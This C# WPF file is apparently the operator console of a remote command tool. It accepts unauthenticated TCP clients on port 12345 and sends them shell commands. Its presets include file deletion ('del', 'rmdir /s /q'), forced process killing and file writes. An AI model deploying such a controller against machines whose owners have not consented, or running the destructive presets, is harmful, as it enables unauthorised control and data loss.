using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Threading;
using System.IO;
using static System.Net.Mime.MediaTypeNames;
using Application = System.Windows.Application;
using Microsoft.SqlServer.Server;

namespace Server.Page
{
    /// <summary>
    /// Home.xaml 的交互逻辑
    /// </summary>
    public partial class Home
    {

        public Home()
        {
            InitializeComponent();
            Loaded += (sender, e) => {
                var fadeInAnimation = new DoubleAnimation { From = 0, To = 1, Duration = TimeSpan.FromSeconds(0.5) };
                BeginAnimation(UIElement.OpacityProperty, fadeInAnimation);
            };

            StartServerAsync(); // 启动服务器异步方法
        }

        public TcpListener listener;
        private readonly List<TcpClient> clients = new List<TcpClient>(); // 用于存储客户端连接
        private TcpClient selectedClient; // 用于存储当前选中的客户端
        private readonly Dictionary<TcpClient, StringBuilder> clientLogs = new Dictionary<TcpClient, StringBuilder>(); // 用于存储每个客户的日志

        private async Task StartServerAsync()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, 12345); // 12345 是服务器端口号
                listener.Start();
                Console.WriteLine("服务器已启动，正在监听端口 12345...");
                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    Console.WriteLine("客户端已连接...");

                    // 将新连接的客户端添加到列表中
                    clients.Add(client);

                    // 初始化该客户端的日志
                    clientLogs[client] = new StringBuilder();

                    Task.Run(() => HandleClientAsync(client));
                }
            }
            finally
            {
                listener.Stop();
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            IPEndPoint remoteEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;
            string ipAddress = remoteEndPoint.Address.ToString();
            int port = remoteEndPoint.Port;
            string newItem = $"{ipAddress} | {port}";
            try
            {
                await Dispatcher.InvokeAsync(() =>
                {
                    if (!Devices.Items.Contains(newItem))
                    {
                        Devices.Items.Add(newItem);
                    }
                });

                byte[] buffer = new byte[1024];
                int bytesRead;
                NetworkStream stream = client.GetStream();
                while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    string dataReceived = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine(">>> " + dataReceived);

                    await Dispatcher.InvokeAsync(() =>
                    {
                        // 向选中的客户端的日志中添加数据
                        clientLogs[selectedClient].Append(dataReceived).Append("\n");

                        // 更新 Log_ 文本
                        Log_.Text = clientLogs[selectedClient].ToString();
                    });

                    // 向所有客户端发送数据，但仅向选中的客户端回复
                    foreach (var c in clients)
                    {
                        if (c != client)
                        {
                            byte[] responseBuffer = Encoding.UTF8.GetBytes(dataReceived);
                            await c.GetStream().WriteAsync(responseBuffer, 0, responseBuffer.Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("错误: " + ex.Message);
            }
            finally
            {
                // 从列表中移除断开的客户端
                clients.Remove(client);

                await Dispatcher.InvokeAsync(() =>
                {
                    Devices.Items.Remove(newItem);
                });

                // 从字典中移除该客户端的日志
                clientLogs.Remove(client);
            }
        }

        private void Devices_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (Devices.SelectedItem != null)
            {
                string selectedItem = Devices.SelectedItem.ToString();
                string[] parts = selectedItem.Split('|');

                if (parts.Length >= 2)
                {
                    string ipAddress = parts[0].Trim();
                    int port = int.Parse(parts[1].Trim());

                    // 根据选中的客户端信息找到相应的TcpClient
                    selectedClient = clients.FirstOrDefault(c =>
                    {
                        IPEndPoint remoteEndPoint = (IPEndPoint)c.Client.RemoteEndPoint;
                        return remoteEndPoint.Address.ToString() == ipAddress && remoteEndPoint.Port == port;
                    });

                    // 更新 Log_ 文本为选中客户端的日志
                    if (selectedClient != null)
                    {
                        Log_.Text = clientLogs[selectedClient].ToString();
                    }
                }
            }
        }


        private async void CommandTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.Key == Key.Enter)
                {
                    string mode = "cmd";
                    if (MsgMode.SelectedIndex == 0)
                        mode = "command";
                    if (MsgMode.SelectedIndex == 1)
                        mode = "string";

                    // 发送数据给选中的客户端
                    if (selectedClient != null)
                    {
                        NetworkStream stream = selectedClient.GetStream();
                        byte[] responseBuffer = Encoding.UTF8.GetBytes(mode + "|" + CommandTextBox.Text);
                        await stream.WriteAsync(responseBuffer, 0, responseBuffer.Length);
                        clientLogs[selectedClient].Append(">>>" + CommandTextBox.Text + "\n");
                        Log_.Text = clientLogs[selectedClient].ToString();
                        CommandTextBox.Text = "";
                    }
                }
            }
            catch (Exception ex)
            {
                Log_.Text += ex.Message.ToString() + "\n";
            }
        }


        private async void Show_Pan_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "wmic logicaldisk get caption";
        }

        private void Show_Files_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "tree [要查看的文件夹、也可为盘符]";
        }

        private void Show_File_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "dir [要查看的文件夹、也可为盘符]";
        }

        private void Del_File_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "del [要删除的文件路径]";
        }

        private void Del_Dir_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "rmdir /s /q <文件夹路径>";
        }

        private void ViewFile_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "type <查看的文本型文件路径>";
        }

        private void WriteFile_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "echo <写到的文本> >> <写到文件的路径>";
        }

        private void OpenWebsite_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "start <打开的网页>";
        }

        private void ViewAllPross_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "tasklist";
        }

        private void KillTask_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            MsgMode.SelectedIndex = 0;
            CommandTextBox.Text = "taskkill /f /t /im <NAME>";
        }
    }
}
